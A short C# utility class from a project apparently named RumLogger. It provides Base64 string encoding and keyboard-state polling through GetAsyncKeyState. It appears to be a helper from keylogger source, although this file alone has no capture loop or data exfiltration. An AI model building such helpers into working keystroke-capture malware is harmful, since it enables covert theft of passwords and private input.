using System;
using System.Text;
using System.Windows.Forms;
using RumLogger.Native;

namespace RumLogger;

public static class Utils
{
    public static string Encode(string str) => Convert.ToBase64String(Encoding.UTF8.GetBytes(str));

    public static bool GetKeyState(Keys key)
    {
        var k = false;
        var shiftState = NativeFunctions.GetAsyncKeyState(key);
        if ((shiftState & 0x8000) == 0x8000)
            k = true;
        return k;
    }

    public static bool GetShiftState() => GetKeyState(Keys.ShiftKey);
}